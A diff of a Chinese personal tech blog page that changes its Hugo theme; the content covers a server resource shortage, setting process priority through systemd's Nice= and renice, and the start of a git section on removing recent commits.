-    <a href="#%e9%80%9a%e8%bf%87systemd%e6%9c%8d%e5%8a%a1%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e4%bf%ae%e6%94%b9%e8%bf%9b%e7%a8%8b%e4%bc%98%e5%85%88%e7%ba%a7" class="header-mark"></a>通过<code>systemd</code>服务配置文件修改进程优先级</h1><p>   在<code>[Service]</code> 下添加 <code>Nice=-10</code>。 <code>Nice</code> 进程优先级，<code>-20</code>-<code>19</code>, 数字越小，优先级越高。 还可以直接修改已启动的进程的优先级 <code>sudo renice -n -10 -p &lt;pid&gt;</code>。可以通过<code>sudo nice -n -10 &lt;command&gt;</code> 直接在启动时指定</p>
-<h1 id="git-删除最近几次提交记录" class="headerLink">
-    <a href="#git-%e5%88%a0%e9%99%a4%e6%9c%80%e8%bf%91%e5%87%a0%e6%ac%a1%e6%8f%90%e4%ba%a4%e8%ae%b0%e5%bd%95" class="header-mark"></a>git 删除最近几次提交记录</h1><div class="highlight"><div class="chroma">
+</div><h1 id="服务器资源不够导致的问题">
+  服务器资源不够导致的问题
+  <a class="heading-link" href="#%e6%9c%8d%e5%8a%a1%e5%99%a8%e8%b5%84%e6%ba%90%e4%b8%8d%e5%a4%9f%e5%af%bc%e8%87%b4%e7%9a%84%e9%97%ae%e9%a2%98">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<p>   由于服务器上的<code>php</code>站点经常受到攻击，于是决定重新调整环境架构，给上个开源<code>waf</code>，部署一切正常，但是在站点正式运行的时，某个站点在访问一个查询页面时候，数据库的<code>cpu</code>使用率消耗疯狂上涨(几百倍)，开始以为是站点被传木马了，一直疯狂查代码，查了很久发现，结果是服务器资源不够，停了一些站点重新分配了下每个容器的资源使用后，目前看起来稳定了，2核8G内存跑了近60个<code>php</code>站点，不知道这是个什么水准的服务器，还是我太水优化不了😂😂😂。</p>
+<h1 id="通过systemd服务配置文件修改进程优先级">
+  通过<code>systemd</code>服务配置文件修改进程优先级
+  <a class="heading-link" href="#%e9%80%9a%e8%bf%87systemd%e6%9c%8d%e5%8a%a1%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e4%bf%ae%e6%94%b9%e8%bf%9b%e7%a8%8b%e4%bc%98%e5%85%88%e7%ba%a7">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<p>   在<code>[Service]</code> 下添加 <code>Nice=-10</code>。 <code>Nice</code> 进程优先级，<code>-20</code>-<code>19</code>, 数字越小，优先级越高。 还可以直接修改已启动的进程的优先级 <code>sudo renice -n -10 -p &lt;pid&gt;</code>。可以通过<code>sudo nice -n -10 &lt;command&gt;</code> 直接在启动时指定</p>
+<h1 id="git-删除最近几次提交记录">
+  git 删除最近几次提交记录
+  <a class="heading-link" href="#git-%e5%88%a0%e9%99%a4%e6%9c%80%e8%bf%91%e5%87%a0%e6%ac%a1%e6%8f%90%e4%ba%a4%e8%ae%b0%e5%bd%95">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -2294,41 +2596,86 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># 报错要修改就只能开分支然后在推送，最后其申请合并 </span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div></div>
-
-        <div class="post-footer" id="post-footer">
-    <div class="post-info">
-        <div class="post-info-line">
-            <div class="post-info-mod">
-                <span>更新于 2024-10-09</span>
-            </div>
-            <div class="post-info-license"><span><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">CC BY-NC-SA 4.0</a></span></div>
-        </div>
-        <div class="post-info-line">
-            <div class="post-info-md"><span><a class="link-to-mardown" href=/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
-                    </span></div>
-            <div class="post-info-share">
-                <span><a href="#" title="分享到 Evernote" data-sharer="evernote" data-url="https://blog.0x5c0f.cc/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/" data-title="那些杂七杂八的记录(一)"><i class="fab fa-evernote fa-fw"></i></a></span>
-            </div>
-        </div>
-    </div>
-
-    <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">解决方案</a></section>
-        <section>
-            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
-        </section>
-    </div>
-
-    <div class="post-nav"><a href="/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/" class="prev" rel="prev" title="那些杂七杂八的记录(二)"><i class="fas fa-angle-left fa-fw"></i>那些杂七杂八的记录(二)</a>
-            <a href="/2019/shellscript%E7%9B%B8%E5%85%B3/" class="next" rel="next" title="Shellscript相关">Shellscript相关<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
-<div id="comments"><div id="waline" class="comment"></div><noscript>
-                Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/">Waline</a>.
-            </noscript></div></article></div>
-        </main><footer class="footer">
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3 id="参见-杂记">
+        参见 杂记
+        <a class="heading-link" href="#%e5%8f%82%e8%a7%81-%e6%9d%82%e8%ae%b0">
+          <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+          <span class="sr-only">链接到标题</span>
+        </a>
+      </h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/">那些杂七杂八的记录(二)</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/2023/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/">内网.外网.宽带.带宽.流量.网速之间的区别与联系</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/2023/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/">常用的BAT脚本语法</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/2022/http%E5%93%8D%E5%BA%94%E7%A0%81/">HTTP响应码</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/2022/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/">Fedora视频桌面</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
     <div class="footer-container"><div class="footer-line"><div id="show-ip"></div><script>document.addEventListener("DOMContentLoaded", function () {fetch("https://ipinfo.io/json?token=c9716df22a6255").then(function (response) {return response.json();}).then(function (data) {document.getElementById("show-ip").innerHTML = data.ip;if (data.country !== "CN") {document.querySelectorAll(".icp, .icp-splitter, .icp-br").forEach(function (el) {el.style.display = "none";});}}).catch(function (error) {document.getElementById("show-ip").innerHTML = "unknown";console.error("状态请求失败:", error);});});</script><script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y)})(window,document,"clarity","script","jtpwi0tdz1");</script></div><div class="footer-line">
-          由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.134.1">Hugo</a> 强力驱动&nbsp;|&nbsp;托管在 <a title="Vercel" href="https://vercel.com" target="_blank" rel="noopener noreffer">Vercel</a> & <a title="Aliyun" href="https://www.aliyun.com" target="_blank" rel="noopener noreffer">Aliyun</a> 上&nbsp;|&nbsp;主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.3.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+          &nbsp;|&nbsp;&nbsp;|&nbsp;
         </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022 -2024</span><span class="author" itemprop="copyrightHolder"
             >&nbsp;<a
               href="/"
@@ -2341,18 +2688,52 @@
           <span class="icp"><a href="https://beian.miit.gov.cn" target="_blank">渝ICP备2020011834号-2</a></span></div>
       <div class="footer-line"></div>
       <div class="footer-line"></div>
-    </div></footer></div>
+    </div></footer>
+  </main>
 
-    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
-            <i class="fas fa-arrow-up fa-fw"></i>
-        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
-            <i class="fas fa-comment fa-fw"></i>
-        </a>
-    </div><div class="assets"><link rel="stylesheet" href="/lib/waline/waline.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
-        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"waline":{"comment":true,"copyright":true,"dark":"body[theme='dark'], body[theme='black']","el":"#waline","emoji":["https://unpkg.com/@waline/emojis/alus"],"lang":"zh-cn","login":"disable","meta":["nick","mail","link"],"pageview":true,"requiredMeta":["mail"],"serverURL":"https://talk.51ac.cc"}},"data":{"desktop-header-typeit":"0x5c0f.cc","mobile-header-typeit":"0x5c0f.cc"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":true},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"_","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":9000,"speed":100}};</script><script type="text/javascript" src="/lib/waline/waline.js" defer></script><script type="text/javascript" src="/js/waline.min.js" defer></script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript">
-            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
-            gtag('config', 'G-06MPV27KSD');
-        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-06MPV27KSD" async></script></div>
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
 </body>
 
 </html>
